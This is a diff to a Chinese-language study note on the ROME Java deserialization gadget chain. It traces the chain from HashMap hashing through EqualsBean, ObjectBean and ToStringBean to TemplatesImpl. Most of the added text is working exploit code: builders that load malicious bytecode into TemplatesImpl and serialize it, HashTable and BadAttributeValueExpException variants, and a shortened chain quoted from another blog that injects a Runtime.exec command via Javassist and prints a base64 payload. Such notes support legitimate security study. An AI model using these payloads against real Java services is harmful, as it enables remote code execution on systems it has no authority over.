@@ -145,7 +145,7 @@ public int beanHashCode() {
 }
 ```
 
-这里结合上面的toString()，其实很任意想到去调用`EqualsBean`的HashCode()然后调用beanHashCode()
+这里结合上面的toString()，其实很容易想到去调用`EqualsBean`的HashCode()然后调用beanHashCode()
 
 ### ObjectBean.hashCode()
 ```java
@@ -157,3 +157,186 @@ public ObjectBean(Class beanClass,Object obj) {
 ![](attachments/Pasted%20image%2020230301160102.png)
 
 也就是说可用跳过`equalsBean.beanHashCode()`直接去触发`toStringBean.toString()`
+
+### HashMap<K,V>.hash(Object)
+用HashMap去触发hashcode，这里就涉及到链子的两种选择，一个是去触发`equalsBean.HashCode`,另一个是去触发`ObjectBea.HashCode()`
+
+exp
+这个是使用equalsBean的，使用ObjectBean的话只要和equalsBean做替换就可以了，当然也可以两个同时用，已经写到注释里了
+```java
+package com.rome;  
+  
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
+import com.sun.syndication.feed.impl.EqualsBean;  
+import com.sun.syndication.feed.impl.ObjectBean;  
+import com.sun.syndication.feed.impl.ToStringBean;  
+  
+import javax.xml.transform.Templates;  
+import java.io.*;  
+import java.lang.reflect.Field;  
+import java.nio.file.Files;  
+import java.nio.file.Paths;  
+import java.util.HashMap;  
+  
+public class ROME_toString {  
+  
+    public static void main(String[] args) throws Exception {  
+        TemplatesImpl templatesimpl = new TemplatesImpl();  
+  
+        byte[] bytecodes = Files.readAllBytes(Paths.get("E:\\JavaSec\\ROME\\target\\classes\\com\\rome\\shell.class"));  
+  
+  
+        setValue(templatesimpl,"_name","aaa");  
+        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});  
+        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());  
+  
+        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);  
+        ////toStringBean.toString();  
+        //只使用EqualsBean  
+        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);  
+        ////equalsBean.hashCode();  
+        //使用两个  
+        ObjectBean objectBean = new ObjectBean(EqualsBean.class, equalsBean);  
+        //只使用ObjectBean  
+        //ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);        ////objectBean.hashCode();        HashMap<Object, Object> hashMap = new HashMap<>();  
+        //hashMap.put(equalsBean, "1");  
+        hashMap.put(objectBean, "1");  
+  
+        //serialize(hashMap);  
+        unserialize("ser.bin");  
+    }  
+  
+    public static void serialize(Object obj) throws IOException {  
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
+        oos.writeObject(obj);  
+    }  
+    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
+        Object obj = ois.readObject();  
+        return obj;  
+    }  
+  
+    public static void setValue(Object obj, String name, Object value) throws Exception {  
+        Field field = obj.getClass().getDeclaredField(name);  
+        field.setAccessible(true);  
+        field.set(obj, value);  
+    }  
+}
+```
+
+## HashTable <=> HashMap
+大同小异的替换
+```java
+Hashtable hashtable= new Hashtable();  
+hashtable.put(equalsBean,"1");  
+serialize(hashtable);
+```
+
+## BadAttributeValueExpException 利用链
+
+在CC链中出现过，`BadAttributeValueExpException`可以调用任意的`toSrting()`方法
+直接去与`toStringBean`衔接
+```java
+BadAttributeValueExpException badAttributeValueExpException =new BadAttributeValueExpException(toStringBean);
+serialize(badAttributeValueExpException);
+```
+
+# 链条精简
+这个y4已经写的很(狠)好了，就不多赘述
+[ROME改造计划 | Y4tacker's Blog](https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/)
+贴一份y4的代码
+Rome.java
+```java
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
+import com.sun.syndication.feed.impl.EqualsBean;  
+import javax.xml.transform.Templates;  
+import java.io.ByteArrayOutputStream;  
+import java.io.ObjectOutputStream;  
+import java.util.Base64;  
+import java.util.HashMap;  
+  
+import static sec.payload.Payload.setFieldValue;  
+  
+  
+public class Rome {  
+  
+	public static void main(String[] args) throws Exception {  
+		TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();  
+		EqualsBean bean = new EqualsBean(String.class,"");  
+		HashMap map1 = new HashMap();  
+		HashMap map2 = new HashMap();  
+		map1.put("aa",templates);  
+		map1.put("bB",bean);  
+		map2.put("aa",bean);  
+		map2.put("bB",templates);  
+		HashMap map = new HashMap();  
+		map.put(map1,"");  
+		map.put(map2,"");  
+  
+		setFieldValue(bean,"_beanClass",Templates.class);  
+		setFieldValue(bean,"_obj",templates);  
+  
+  
+		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
+		ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
+		objectOutputStream.writeObject(map);  
+		System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));  
+  
+		System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());  
+	}  
+  
+}
+```
+GetTemplatesImpl.java
+```java
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
+import java.lang.reflect.Field;  
+  
+public class GetTemplatesImpl {  
+    public static TemplatesImpl getTemplatesImpl() throws Exception{  
+  
+        byte[][] bytes = new byte[][]{GenerateEvilByJavaassist.generate()};  
+  
+  
+  
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();  
+        setValue(templates, "_bytecodes", bytes);  
+        setValue(templates, "_name", "1");  
+        setValue(templates, "_tfactory", null);  
+  
+  
+        return  templates;  
+    }  
+  
+    public static void setValue(Object obj, String name, Object value) throws Exception{  
+        Field field = obj.getClass().getDeclaredField(name);  
+        field.setAccessible(true);  
+        field.set(obj, value);  
+    }  
+}
+```
+GenerateEvilByJavaassist.java
+```java
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
+import javassist.ClassPool;  
+import javassist.CtClass;  
+import javassist.CtConstructor;  
+  
+public class GenerateEvilByJavaassist {  
+    public static byte[] generate() throws Exception{  
+        ClassPool pool = ClassPool.getDefault();  
+        CtClass clazz = pool.makeClass("a");  
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());  
+        clazz.setSuperclass(superClass);  
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);  
+        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");  
+        clazz.addConstructor(constructor);  
+        return clazz.toBytecode();  
+    }  
+  
+  
+}
+```
+# 小结
+这个链子的精华就是调用任意的get开头的方法
